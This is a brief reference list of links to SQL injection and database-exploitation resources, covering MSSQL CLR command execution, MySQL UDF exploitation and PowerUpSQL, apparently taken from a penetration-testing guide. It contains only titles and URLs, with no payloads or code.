- PayloadsAllTheThings SQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- MSSQL for Pentesters - CLR Assembly: https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-clr-assembly/
- MySQL UDF Exploitation: https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf
- PowerUpSQL: https://github.com/NetSPI/PowerUpSQL
